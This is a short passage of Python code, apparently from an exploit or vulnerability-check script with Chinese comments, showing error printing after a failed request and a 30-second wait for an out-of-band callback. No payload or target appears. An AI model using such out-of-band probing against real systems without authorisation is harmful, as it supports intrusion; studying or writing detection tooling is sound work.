    \    except Exception as e:\n        print(f\"[-] Request failed: {e}\")\n\n \
    \   # 等待带外回调\n    print(\"[*] Waiting for OOB callback...\")\n    try:\n     \
    \   # 假设 OOBReceiver 提供阻塞等待方法，超时 30 秒\n        req = oob.wait(timeout=30)\n  \
